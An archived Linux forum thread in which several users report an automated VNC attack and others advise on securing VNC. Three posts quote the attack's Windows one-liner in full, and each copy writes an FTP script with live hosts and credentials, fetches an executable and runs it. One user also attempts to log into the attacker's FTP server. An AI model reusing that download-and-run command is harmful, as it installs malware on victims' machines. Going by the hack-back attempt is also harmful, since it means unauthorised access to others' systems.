---
title: "&quot;you got owned&quot;"
date: 2008-11-13
forum: Security
---

### Post by FlemmingJ on 2008-11-13
hi all

I believe I have been hacked via VNC. Transcipts follows. The "ftp.freewebtown.com" is indeed black listed. Do you guys have any comments:

transcript start
root@filserver:/media/ntfs1# 7~
^[[B
bash: 7~: command not found
root@filserver:/media/ntfs1# 
root@filserver:/media/ntfs1# cmd /c echo open ftp.freewebtown.com 21 >> ik &echo user zezaku karitasi1 >> ik &echo binary >> ik &echo get drivelibs.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &drivelibs.exe &exit
[1] 5920
[2] 5921
[3] 5922
[4] 5923
[5] 5924
[6] 5925
[7] 5926
[8] 5927
exit
bash: del: command not found
bash: drivelibs.exe: command not found
echo You got owned
flemming@filserver:~$ echo You got owned
You got owned
flemming@filserver:~$ ftp: s: unknown option
bash: cmd: command not found
transcript end

best regards Flemming

---

### Post by Kinstonian on 2008-11-13
Change your password immediately, and better yet disable VNC for now.  Have you been keeping VNC patched?  It looks like an automated attacked against Windows computers, but it may not be long before the attacker comes back and does it manually knowing you're running Linux.  When did this happen?

---

### Post by damis648 on 2008-11-13
Definitely an automated Windows attack. It references to dos-like commands and EXEs, and, if done manually, the attacker would notice that the prompt looks nothing like a DOS prompt. Change your passwords immediately, and probably will want to block this IP or something.

EDIT: Later I will try logging in to this account and deleting all the files on the FTP server or something I don't know. ;-)

---

### Post by Dr Small on 2008-11-13
It's an automated Windows Attack, from what I can tell. Shutdown VNC, change the password and close the port (if you don't need it open).

---

### Post by srt4play on 2008-11-13
> **damis648 said:**
> Later I will try logging in to this account and deleting all the files on the FTP server or something I don't know. ;-)

I see that site is empty now, good job!

---

### Post by damis648 on 2008-11-13
> **srt4play said:**
> I see that site is empty now, good job!

Actually, I didn't do it... someone must have beat me to it! :lolflag:

---

### Post by Mardoct909 on 2008-11-14
This is why I avoid any form of remote controlling other computers whenever possible.

---

### Post by FlemmingJ on 2008-11-17
> **Dr Small said:**
> It's an automated Windows Attack, from what I can tell. Shutdown VNC, change the password and close the port (if you don't need it open).

hi Dr Small et all

thx for answers. I have changed VNC port and password.

regards Flemming

---

### Post by Kinstonian on 2008-11-17
Were you keeping VNC updated?  Saying it was due to your password being compromised is a good guess, but it's still a guess.  It's been a while since you last posted, are you just now taking measures to resolve this incident?  The longer someone had unauthorized access to your computer the worse off you are.

Check your login records, system logs, bash history, processes, network connections, use rkhunter or chkrootkit, and look for signs you have been fully compromised.  Right now you know someone attacked your computer, gained access, but they weren't able to do anything with that access because you got lucky.  The question is has your luck run out?  Did he come back?  Did someone else exploit that same vulnerability?

---

### Post by buyyourall4 on 2008-11-17
Hello, are you looking for Nokia and other [chinese mobile phones](http://www.buyyourall.com)?  pleease click [[color=Red]**HERE**[/color]](http://www.buyyourall.com) you can find lots of [chinese mobile phones ](http://www.buyyourall.com)there

---

### Post by DPic on 2009-02-26
So every day starting a little while ago, i get a number of requests to access my desktop. Always from different addresses. One day, i decide to accept it with text editor open with the text, "Who is this?" (riskay, i know). It seems to be an automated script they enters in some windows command and disconnects. Today i recorded it. 

```
cmd /c echo open 87.230.22.187/httpdocs/img/ 21 >> ik &echo user zf Z@z1humensk1 >> ik &echo binary >> ik &echo get com.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &com.exe &exit
echo You got owned
```

Obviously, this is for windows, but i was wondering if there's any way to find out what it does, how many windows users get hit by this (hey, it would be a great selling point for Ubuntu! haha), and whether the hackers can be tracked down, or deleting all the files like above? 

I wonder how harmful the command is since "You got owned" sounds playful, but then again that doesn't mean anything

---

### Post by movieman on 2009-02-27
The only safe way to run VNC is localhost-only with ssh-forwarding to connect from remote machines.

It's trying to download a Windows program and run it; that could do anything, but whatever it did would probably be bad.

---

### Post by DPic on 2009-02-27
> **movieman said:**
> The only safe way to run VNC is localhost-only with ssh-forwarding to connect from remote machines.

How do you do that? 

What's wrong with requiring permission and/or a password? If someone finds a security hole they can get in?

---

### Post by movieman on 2009-02-27
> **DPic said:**
> How do you do that

Run vnc localhost-only.

Connect with ssh -L localhost:5901:localhost:5901

Connect to VNC on localhost:1 rather than your_remote_host:1, and ssh will forward the connection in a secure manner.

> What's wrong with requiring permission and/or a password? If someone finds a security hole they can get in?

Passwords are often weak and they're typically sent in plaintext across the Internet unless you have some kind of encryption addon for VNC. Using ssh with a public key is generally far more secure, absent ssh security holes.

In addition, if you don't use encryption or ssh with VNC then the VNC data will also be sent unencrypted over the Internet.

---

### Post by x3roconf on 2009-02-28
> **DPic said:**
> 
Obviously, this is for windows, but i was wondering if there's any way to find out what it does, how many windows users get hit by this (hey, it would be a great selling point for Ubuntu! haha), and whether the hackers can be tracked down, or deleting all the files like above? 

I wonder how harmful the command is since "You got owned" sounds playful, but then again that doesn't mean anything

When you run files like this on windows box your computer connects to botnet. Most botnets are using irc protocol without ssl or anything so
you can use packet sniffer to sniff login details. I was used to sniff botnets a year ago (I used nepenthes which is in repos) and I managed to get in some nice nets (It's not illegal)

---

### Post by mr-woof on 2009-03-01
What exactly does the automated attack do? I can see that it copies a file from the ftp to your drive, any ideas what this file does?

---

### Post by damis648 on 2009-03-01
> **mr-woof said:**
> What exactly does the automated attack do? I can see that it copies a file from the ftp to your drive, any ideas what this file does?

On it. Will reply once i figure it out. The fact it's a com file means it's just like a batch script.

---

### Post by mr-woof on 2009-03-01
It'll be interesting to see what you find out, it has to be some sort of trojan/botnet type attack

---

### Post by damis648 on 2009-03-01
Hm, I can't get in. I can telnet in, SSH in, and FTP, but no username/pass combination I try will be accepted.:confused:

---

### Post by mr-woof on 2009-03-01
booo :(

---

### Post by damis648 on 2009-03-01
I can whois though, seems to be some German hosting. Anyway, it looks as if they changed the username and password.

---

### Post by mr-woof on 2009-03-01
That was probably hacked too and they've realised

---

### Post by damis648 on 2009-03-01
> **mr-woof said:**
> That was probably hacked too and they've realised

Yes, look at what a quick google turns up:
[http://forums.penny-arcade.com/showthread.php?t=75759](http://forums.penny-arcade.com/showthread.php?t=75759)

---

### Post by AbsintheFairy on 2009-07-08
*I got this, started *4 days ago and was once a day but now seems to be once an hr ..My tech has allowed remote access for him to be able to do stuff ...I don't know how to turn it off and now I'm afraid I will lose everything. I switched to Linux because I had lost 2 PC's through Trojans :(

cmd /c echo open 208.248.82.3 21 >> ik &echo user hycsju hyc7186 >> ik &echo binary >> ik &echo get system.exe >> ik cho bye >> ik &ftp -n -v -s:ik &del ik &system.exe &exit
 echo You got owned

I checked the number through samspade.org cos it looks like a IP address but it said unknown

If I get Linux removed and freshly installed will that get rid of it? Would it go through the partitions to XP which is on the PC but never used?

Should warn you I am not savvy technically at all  :frown:

---

### Post by Agent ME on 2009-07-08
System -> Preferences -> Remote Desktop

You can disable it entirely from there if you want by unchecking the top box.

---

### Post by AbsintheFairy on 2009-07-08
Thank you Agent, have done that and so far so good. Today it was appearing every 10 mins so I will be over the moon if it's cured \\:D/

---

